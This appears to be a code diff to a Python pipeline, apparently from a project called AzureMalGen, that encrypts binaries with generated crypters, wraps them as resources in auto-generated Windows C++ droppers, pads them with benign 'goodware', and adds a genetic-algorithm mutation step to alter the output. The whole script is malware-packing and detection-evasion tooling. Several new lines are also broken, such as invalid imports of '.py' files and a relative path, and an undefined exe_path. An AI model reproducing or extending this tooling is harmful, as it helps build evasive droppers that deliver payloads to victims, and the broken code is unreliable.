@@ -8,10 +8,12 @@ import CreateCrypt #creates an encrypt and decrypt function
 # void decryptFile(const std::string& inputFile, const std::string& outputFile, char key)
 #saves to generated/crypt
 from pathlib import Path
+import EnsureGAdockerRunning.py
 import base64
 import CreateDropper
 import GenerateRES
 import BuildExes
+import ../GeneticPart/Genetic.py as Gene
 #make sure all needed folders are here
 base_dirs = {
     "crypt": "generated/crypt",
@@ -46,7 +48,7 @@ parser = argparse.ArgumentParser(description="Full pipeline of encrypting and de
 parser.add_argument("--binaries", "--b", nargs="+", required=True, help="List of binaries or folders to encrypt")
 parser.add_argument("--EncryptCount","--e", type=int, default=1, help="How many times to generate encryption types")
 parser.add_argument("--key", type=int, default=random.randint(1, 255), help="Encryption key")
-parser.add_argument("--genetic","--g",type=int,default=1,help = "apply the genetic algo to the binary")
+parser.add_argument("--genetic","--g",type=int,default=0,help = "apply the genetic algo to the binary")
 parser.add_argument("--extrareasorces","--eg", type=int,default =0, help = "how much extragoodware to append to reasorces")
 parser.add_argument("--base64",type = int,default=0,help="add base64 encoding to the binary")
 args = parser.parse_args()
@@ -66,8 +68,7 @@ if not cpp_files:
     raise FileNotFoundError("No C++ files found in generated/crypt!")
 
 cpp_file1 = os.path.join( "generated/crypt", random.choice(cpp_files))
-#temprorary !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-#cpp_file1 = "/home/rcof8/repos/GeneticAlgo/AzureMalGen/generated/crypt/generated_script_20251113_192331.cpp"
+
 encrypt_script = os.path.join(os.path.dirname(__file__), "encrypt.py")  
 cmd = [
     "python3",
@@ -121,8 +122,7 @@ print("Second encryptor used:", cpp_file2)
 
 double_enc_dir = Path("generated/double_encrypted_binaries")                                             #base64 encode if needed
 base64_dir = Path("generated/base64encrypted")
-
-# Determine which folder the rest of the pipeline should use                                                       
+                                                     
 if b64:
     base64_dir.mkdir(parents=True, exist_ok=True)
 
@@ -145,13 +145,12 @@ else:
                                                                                                                         #3 make the res.rc folders
 GenerateRES.generate_all_resources(str(working_binary_dir),"generated/resfiles",extragoodware )
 
-# Iterate over all .rc files
+
 for rc_file in os.listdir("generated/resfiles"):                                                                        #4 make all the droppers
     if rc_file.endswith(".rc"):
-        base_name = os.path.splitext(rc_file)[0]  # e.g., "file1"
+        base_name = os.path.splitext(rc_file)[0]  
         dropper_cpp_path = os.path.join("generated/Generated_DropperCPPfiles", f"{base_name}.cpp")
 
-        # Create a basic C++ dropper template
         cpp_content = f"""// Auto-generated dropper for {rc_file}
             #include <windows.h>
             #include <iostream>
@@ -163,13 +162,18 @@ for rc_file in os.listdir("generated/resfiles"):                                
             }}
             """
 
-        # Write the C++ file
+       
         with open(dropper_cpp_path, "w", encoding="utf-8") as f:
             f.write(cpp_content)
 
         print(f"✅ Created dropper CPP: {dropper_cpp_path}")
 
-        # Call CreateDropper on the newly created CPP
         CreateDropper.create_dropper(dropper_cpp_path, cpp_file1, cpp_file2, key, key,b64)
 
 BuildExes.build_all("generated/Generated_DropperCPPfiles", "generated/resfiles","generated/finalexes")                    # compile all the droppers with their needed res
+if(genetic):
+    mutatableSections = [101 + i for i in range(1,extragoodware)]
+    EnsureGAdockerRunning.ensure_container_running()
+
+    Gene.genetic_algo(4,8,exe_path,"../GeneticPart/goodware/",exe_path,mutatableSections)
+    
